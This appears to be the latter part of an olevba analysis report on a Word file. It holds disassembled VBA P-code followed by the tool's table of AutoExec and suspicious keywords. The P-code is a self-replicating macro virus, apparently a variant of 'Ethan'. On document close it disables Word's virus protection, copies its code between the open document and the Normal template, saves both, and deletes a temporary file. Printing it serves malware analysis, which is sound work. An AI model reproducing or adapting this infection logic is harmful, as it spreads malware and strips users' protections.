' Line #175:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #176:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #177:
' 	EndIfBlock 
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	StartWithExpr 
' 	Ld wdDialogFileSumaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' Line #180:
' 	StartWithExpr 
' 	Ld wdDialogFileSumaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' Line #181:
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' Line #182:
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' Line #183:
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' Line #184:
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' Line #185:
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywrds 
' 	BoS 0x0000 
' Line #186:
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywrds 
' 	BoS 0x0000 
' Line #187:
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' Line #188:
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' Line #189:
' 	EndWith 
' Line #190:
' 	EndWith 
' Line #191:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #192:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #193:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #194:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #195:
' 	EndIfBlock 
' Line #196:
' 	EndIfBlock 
' Line #197:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #198:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #199:
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' Line #200:
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' Line #201:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #202:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #203:
' 	EndSub 
' Line #204:
' 	EndSub 
' Line #205:
' 	FuncDefn (Private Sub Document_Close())
' Line #206:
' 	OnError skam 
' Line #207:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #208:
' 	ArgsCall SWLABS99 0x0000 
' Line #209:
' 	Label skam 
' Line #210:
' 	EndSub 
' Line #211:
' 	FuncDefn (Private Sub SWLABS99())
' Line #212:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #213:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #214:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #215:
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #216:
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #217:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #218:
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #219:
' 	Wend 
' Line #220:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #221:
' 	EndIfBlock 
' Line #222:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #223:
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #224:
' 	ElseBlock 
' Line #225:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #226:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #227:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #228:
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #229:
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #230:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #231:
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #232:
' 	Wend 
' Line #233:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #234:
' 	EndIfBlock 
' Line #235:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #236:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #237:
' 	EndIfBlock 
' Line #238:
' 	EndIfBlock 
' Line #239:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

